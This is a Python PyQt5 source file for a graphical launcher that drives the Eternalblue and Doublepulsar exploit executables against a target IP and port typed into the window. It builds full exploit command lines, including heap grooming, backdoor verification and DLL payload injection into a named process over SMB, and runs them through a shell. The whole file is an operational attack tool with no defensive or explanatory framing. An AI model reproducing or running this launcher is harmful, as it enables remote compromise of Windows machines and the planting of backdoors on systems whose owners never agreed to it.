from PyQt5 import QtWidgets
from PyQt5.QtWidgets import QFileDialog
from PyQt5.QtCore import pyqtSignal, QThread
from Ui_nsaui import Ui_Dialog
import os, subprocess, time

keys = {}

class NsaWindow(QtWidgets.QDialog, Ui_Dialog):
    #sinkeys = pyqtSignal()  
    def __init__(self):
        super(NsaWindow,self).__init__()
        self.setupUi(self)
        self.DllPathButton.clicked.connect(self.selectDpath)
        self.LogFileButton.clicked.connect(self.selectLpath)
        self.EternalblueButton.clicked.connect(self.Estart)
        self.DoublepulsarButton.clicked.connect(self.Dstart)
        
        #self.sinkeys.connect(CoreFun.start)
        self.cthread = CoreFun()
        self.cthread.sinOut.connect(self.pp)

    def selectDpath(self):
        self.open = QFileDialog()
        self.path=self.open.getOpenFileName()
        self.DllPathEdit.setText(self.path[0])
        
    def selectLpath(self):
        self.open = QFileDialog()
        self.path=self.open.getOpenFileName()
        self.LogFileEdit.setText(self.path[0])
        
    
    def Estart(self):
        keys.clear()
        keys['TargetIp'] = self.TargetEdit.text().split(':')[0]
        keys['TargetPort'] = self.TargetEdit.text().split(':')[1]
        keys['TargetOs'] = self.TargetOscomboBox.currentText()
        keys['OutputFile'] = self.LogFileEdit.text()
        keys['exe'] = 'Eternalblue-2.2.0.exe'
        #keys['ProcessName'] = self.ProcessNameEdit.text()
        #keys['DllPath'] = self.DllPathEdit.text()
        self.textBrowser.setText('')
        self.cthread.Ego()
        
    def Dstart(self):
        keys.clear()
        keys['TargetIp'] = self.TargetEdit.text().split(':')[0]
        keys['TargetPort'] = self.TargetEdit.text().split(':')[1]
        #keys['TargetOs'] = self.TargetOscomboBox.currentText()
        keys['ProcessName'] = self.ProcessNameEdit.text()
        keys['OutputFile'] = self.LogFileEdit.text()
        keys['DllPayload'] = self.DllPathEdit.text()
        keys['Architecture'] = self.ArchitecturecomboBox.currentText()
        keys['exe'] = 'Doublepulsar-1.3.1.exe'
        self.textBrowser.setText('')
        self.cthread.Dgo()

    def pp(self, val):
        #self.textBrowser.append(val)
        self.textBrowser.append(val.strip('b\'\\r\\n'))
        
class CoreFun(QThread):    
    sinOut = pyqtSignal(str) 
    def __init__(self):
        super(CoreFun, self).__init__()
        #self.sinOut.connect(self.Ego)
        #self.sinOut.connect(self.Dgo)
        
    def Ego(self):
        self.start()
        
    def Dgo(self):
        self.start()
        
    def run(self):
        if keys['exe'] == 'Doublepulsar-1.3.1.exe':
            comm = str(os.getcwd())+'/dll/Doublepulsar-1.3.1.exe '
            for k, v in keys.items():
                if k!='exe':
                    comm = comm + '--'+str(k)+' '+str(v)+' '
            comm = comm + ' --DllOrdinal 1 --ProcessCommandLine --Protocol SMB --Function Rundll'
            comm = comm.replace('\\','/' )
        if keys['exe'] == 'Eternalblue-2.2.0.exe':
            comm = str(os.getcwd())+'/dll/Eternalblue-2.2.0.exe '
            for k, v in keys.items():
                if k!='exe':
                    comm = comm + '--'+str(k)+' '+str(v)+' '
            comm = comm + '--DaveProxyport=0 --NetworkTimeout 60 --VerifyTarget True --VerifyBackdoor True --MaxExploitAttempt 3 --GroomAllocations 12 '
            comm = comm.replace('\\','/' )
        print (comm)
        a = subprocess.Popen(comm, stdout = subprocess.PIPE, shell=True)
        while True:
            if a.poll() != None and a.stdout.readline()==b'':
                self.sinOut.emit('exit')
                break
            self.sinOut.emit(str(a.stdout.readline()))
            time.sleep(0.01)

if __name__ == '__main__':
    import sys
    app = QtWidgets.QApplication(sys.argv)
    dialog = NsaWindow()
    dialog.show()
    sys.exit(app.exec_())
    
